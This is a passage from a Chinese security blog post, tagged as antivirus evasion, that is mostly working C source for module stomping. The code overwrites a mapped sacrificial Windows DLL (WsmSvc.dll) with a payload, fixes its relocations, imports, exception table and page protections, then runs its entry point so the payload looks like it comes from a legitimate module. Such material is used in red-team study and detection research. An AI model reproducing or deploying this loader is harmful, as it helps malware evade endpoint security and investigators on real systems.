class="literal">NULL</span>, &amp;viewSize, ViewShare, <span class="number">0</span>, PAGE_READWRITE);</span><br><span class="line">    NtClose(hSection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] NtMapViewOfSection failed with status: 0x%X\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Sacrificial DLL mapped (SEC_IMAGE) at %p\n&quot;</span>, mappedAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 Payload 的 PE 头信息</span></span><br><span class="line">    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取牺牲 DLL 的 PE 头信息</span></span><br><span class="line">    PIMAGE_DOS_HEADER targetDos = (PIMAGE_DOS_HEADER)mappedAddress;</span><br><span class="line">    PIMAGE_NT_HEADERS targetNt = (PIMAGE_NT_HEADERS)((PBYTE)mappedAddress + targetDos-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查架构匹配</span></span><br><span class="line">    <span class="keyword">if</span> (ntHeaders-&gt;FileHeader.Machine != targetNt-&gt;FileHeader.Machine) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error: Architecture mismatch.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 确认牺牲 DLL 的空间是否足够大！</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (targetNt-&gt;OptionalHeader.SizeOfImage &lt; ntHeaders-&gt;OptionalHeader.SizeOfImage) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Error: Sacrificial DLL is too small! (Target Size: %u, Payload Size: %u)\n&quot;</span>,</span><br><span class="line">            targetNt-&gt;OptionalHeader.SizeOfImage, ntHeaders-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    Please choose a larger sacrificial DLL.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Size check passed. Target Size: %u, Payload Size: %u\n&quot;</span>,</span><br><span class="line">        targetNt-&gt;OptionalHeader.SizeOfImage, ntHeaders-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 逐个走动牺牲 DLL 的部分表，并逐个解除保护 (PAGE_READWRITE)</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Making sacrificial memory sections writable...\n&quot;</span>);</span><br><span class="line">    PIMAGE_SECTION_HEADER targetSection = IMAGE_FIRST_SECTION(targetNt);</span><br><span class="line">    DWORD oldProtect;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改整个 Image 大小的权限，而不仅是 header</span></span><br><span class="line">    VirtualProtect(mappedAddress, targetNt-&gt;OptionalHeader.SizeOfImage, PAGE_READWRITE, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.3 内存可写时，先将整个目标区域归零！</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// 这确保了信标的 BSS 全局值从零开始，而不是继承原 DLL 在这些位置的值。</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Zeroing out the sacrificial memory...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mappedAddress, <span class="number">0</span>, targetNt-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 覆盖内存！(复制 Header 和 Sections)</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Overwriting sacrificial memory with payload headers...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    DWORD sizeOfHeaders = ntHeaders-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">    <span class="keyword">if</span> (sizeOfHeaders &gt; payloadSize) sizeOfHeaders = payloadSize;</span><br><span class="line">    <span class="built_in">memcpy</span>(mappedAddress, payloadBuffer, sizeOfHeaders);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Copying payload sections...\n&quot;</span>);</span><br><span class="line">    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sectionHeader[i].SizeOfRawData &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            PVOID dest = (PVOID)((ULONG_PTR)mappedAddress + sectionHeader[i].VirtualAddress);</span><br><span class="line">            PVOID src = (PVOID)(payloadBuffer + sectionHeader[i].PointerToRawData);</span><br><span class="line">            <span class="built_in">memcpy</span>(dest, src, sectionHeader[i].SizeOfRawData);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 执行基址重定位和修复导入表！</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Trying to perform Base Relocation...\n&quot;</span>);</span><br><span class="line">    __try &#123;</span><br><span class="line">        PerformBaseRelocation(mappedAddress, payloadBuffer, ntHeaders);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Exception caught during Base Relocation!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Trying to resolve Import Table...\n&quot;</span>);</span><br><span class="line">    __try &#123;</span><br><span class="line">        ResolveImportTable(mappedAddress, ntHeaders);</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Exception caught during Import Table resolution!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 注册异常处理表 (.pdata) - 极其重要！</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY exceptionDir = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];</span><br><span class="line">    <span class="keyword">if</span> (exceptionDir.Size &gt; <span class="number">0</span> &amp;&amp; exceptionDir.VirtualAddress &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        PIMAGE_RUNTIME_FUNCTION_ENTRY pExceptionTable = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((ULONG_PTR)mappedAddress + exceptionDir.VirtualAddress);</span><br><span class="line">        DWORD exceptionCount = exceptionDir.Size / <span class="keyword">sizeof</span>(IMAGE_RUNTIME_FUNCTION_ENTRY);</span><br><span class="line">        <span class="keyword">if</span> (RtlAddFunctionTable(pExceptionTable, exceptionCount, (DWORD64)mappedAddress)) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Exception table (.pdata) registered successfully.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to register exception table.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8. 修复内存权限 (按节区特性应用正确的权限)</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Fixing section permissions...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        PVOID sectionAddress = (PVOID)((ULONG_PTR)mappedAddress + sectionHeader[i].VirtualAddress);</span><br><span class="line">        DWORD sectionSize = sectionHeader[i].Misc.VirtualSize;</span><br><span class="line">        DWORD characteristics = sectionHeader[i].Characteristics;</span><br><span class="line">        DWORD protect = PAGE_NOACCESS;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_EXECUTE) &#123;</span><br><span class="line">            <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_READ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_WRITE) protect = PAGE_EXECUTE_READWRITE;</span><br><span class="line">                <span class="keyword">else</span> protect = PAGE_EXECUTE_READ;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123;</span><br><span class="line">                protect = PAGE_EXECUTE_WRITECOPY;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                protect = PAGE_EXECUTE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_READ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_WRITE) protect = PAGE_READWRITE;</span><br><span class="line">                <span class="keyword">else</span> protect = PAGE_READONLY;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (characteristics &amp; IMAGE_SCN_MEM_WRITE) &#123;</span><br><span class="line">                protect = PAGE_WRITECOPY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        VirtualProtect(sectionAddress, sectionSize, protect, &amp;oldProtect);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9. 保护头部 (将 PE 头设为只读)</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Protecting headers (PAGE_READONLY)...\n&quot;</span>);</span><br><span class="line">    VirtualProtect(mappedAddress, ntHeaders-&gt;OptionalHeader.SizeOfHeaders, PAGE_READONLY, &amp;oldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 找到我们 Payload 的 DllMain 地址</span></span><br><span class="line">    DWORD entryPointRva = ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* DllMain_t)</span><span class="params">(HINSTANCE, DWORD, LPVOID)</span>;</span><br><span class="line">    DllMain_t entryPoint = (DllMain_t)((ULONG_PTR)mappedAddress + entryPointRva);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (entryPointRva != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Executing hijacked payload entry point at %p!\n&quot;</span>, entryPoint);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修复：在调用入口点之前，必须确保依赖的 DLL (如 user32.dll) 已经被加载到进程中。</span></span><br><span class="line">        <span class="comment">// 虽然我们在 ResolveImportTable 中调用了 LoadLibraryA，但为了保险起见，</span></span><br><span class="line">        <span class="comment">// 我们在这里显式加载 user32.dll，因为 MessageBoxA 依赖它。</span></span><br><span class="line">        LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 DllMain (DLL_PROCESS_ATTACH)</span></span><br><span class="line">        __try &#123;</span><br><span class="line">            BOOL result = entryPoint((HINSTANCE)mappedAddress, DLL_PROCESS_ATTACH, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Entry point returned: %d\n&quot;</span>, result);</span><br><span class="line">        &#125;</span><br><span class="line">        __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Exception caught during payload execution! Code: 0x%X\n&quot;</span>, GetExceptionCode());</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    [!] This is usually because MSVC&#x27;s CRT initialization (_DllMainCRTStartup) fails\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;        when a DLL is manually mapped and not registered in the PEB.\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Payload has no entry point.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Demonstration complete. The process looks like it loaded WsmSvc.dll, but ran our payload!\n&quot;</span>);</span><br><span class="line">    getchar(); <span class="comment">// 暂停，方便你用 Process Hacker 观察</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时堆栈情况</p>
+<p><a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260409100505302.png" title="image-20260409100505302" class="gallery-item" style="box-shadow: none;"> <img src="https://cdn.jsdelivr.net/gh/250wuyifan/WaiLian250/img/image-20260409100505302.png" alt="image-20260409100505302"></a>正如你现在从堆栈中看到的，操作源自与 WsmSvc.dll 关联的内存。</p>
+</div>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2026-04-08</span>
+            
+                <span>该篇文章被 CHANGMEN</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/%E5%85%8D%E6%9D%80/'>
+                            免杀
+                        </a>
+                    
+                </span>
+             
+             
+        
+        </i>
+    </div>
+    <br>
+    
+    
+        
+            
+    
+            <div class="post-footer-pre-next">
+                
+
+                
+            </div>
+    
+        
+    
+
+    
+        
+
+     
+</div>
+
+
+
+
+                    
+
+                    <div class="footer">
+    
+        <span> 
+            © 2024 CHANGMEN | Network Security Enthusiast 
+
+            
+                
+
+            
+        </span>
+       
+    
+</div>
+
+
+
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊看过大海的人不会忘记海的广阔🌊</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery/lightgallery.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-thumbnail.umd.min.js"></script>
+
+
+
+<script src="/js/lightgallery/plugins/lg-fullscreen.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-autoplay.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-zoom.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-rotate.umd.min.js"></script>
+
+
+<script src="/js/lightgallery/plugins/lg-paper.umd.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+     
+    if (typeof lightGallery !== "undefined") {
+        var options1 = {
+            selector: '.gallery-item',
+            plugins: [lgThumbnail, lgFullscreen, lgAutoplay, lgZoom, lgRotate, lgPager], // 启用插件
+            thumbnail: true,          // 显示缩略图
+            zoom: true,               // 启用缩放功
+            rotate: true,             // 启用旋转功能能
+            autoplay: true,        // 启用自动播放功能
+            fullScreen: true,      // 启用全屏功能
+            pager: false, //页码,
+            zoomFromOrigin: true,   // 从原始位置缩放
+            actualSize: true,       // 启用查看实际大小的功能
+            enableZoomAfter: 300,    // 延迟缩放，确保图片加载完成后可缩放
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options1); // 修复选择器
+    }
+    
+</script>
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script> 
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+</html>
+<script src="/js/emojiHandler.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        wrapEmojis('.paper');
+    });
+</script>
